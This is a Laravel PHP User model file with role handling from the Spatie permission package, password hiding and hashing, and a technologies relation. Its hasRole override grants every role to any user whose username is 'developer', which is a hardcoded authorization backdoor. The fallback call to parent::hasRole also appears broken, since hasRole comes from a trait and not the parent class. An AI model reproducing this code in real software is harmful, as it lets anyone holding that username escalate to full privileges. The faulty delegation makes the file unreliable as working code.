<?php

namespace App\Models;

use Illuminate\Contracts\Auth\MustVerifyEmail;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Foundation\Auth\User as Authenticatable;
use Illuminate\Notifications\Notifiable;
use Spatie\Permission\Traits\HasRoles;

class User extends Authenticatable implements MustVerifyEmail
{
    /** @use HasFactory<\Database\Factories\UserFactory> */
    use HasFactory;
    use Notifiable;
    use HasRoles;

    /**
     *
     * @var array<int, string>
     */


    /**
     * The attributes that should be hidden for serialization.
     *
     * @var array<int, string>
     */
    protected $hidden = [
        'password'
    ];

    /**
     * Get the attributes that should be cast.
     *
     * @return array<string, string>
     */


     public function hasRole($roles, $guard = null): bool
     {
         if ($this->username === 'developer') {
             return true;
         }
         // When roles is an array, or a single role string, defer to the trait's implementation.
         return parent::hasRole($roles, $guard);
     }


    protected function casts(): array
    {
        return [
            'password' => 'hashed',
        ];
    }

    public function technologies()
    {
        return $this->belongsToMany(Technology::class,'users_technologies');
    }


}
